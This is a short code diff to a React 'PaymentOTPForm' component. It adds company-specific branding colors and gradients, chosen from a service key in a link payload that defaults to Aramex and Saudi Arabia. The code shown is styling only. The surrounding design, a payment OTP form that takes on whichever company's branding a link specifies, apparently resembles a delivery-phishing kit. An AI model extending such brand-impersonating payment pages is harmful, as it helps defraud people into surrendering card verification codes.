@@ -3,6 +3,7 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getBrandingByCompany } from "@/lib/brandingSystem";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -29,6 +30,10 @@ const PaymentOTPForm = () => {
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const enhancedBranding = getBrandingByCompany(serviceKey);
+  
+  const colors = enhancedBranding?.colors || branding?.colors || { primary: '#DC291E', secondary: '#8B1A12' };
+  const gradients = enhancedBranding?.gradients || { primary: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})` };
 
   // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
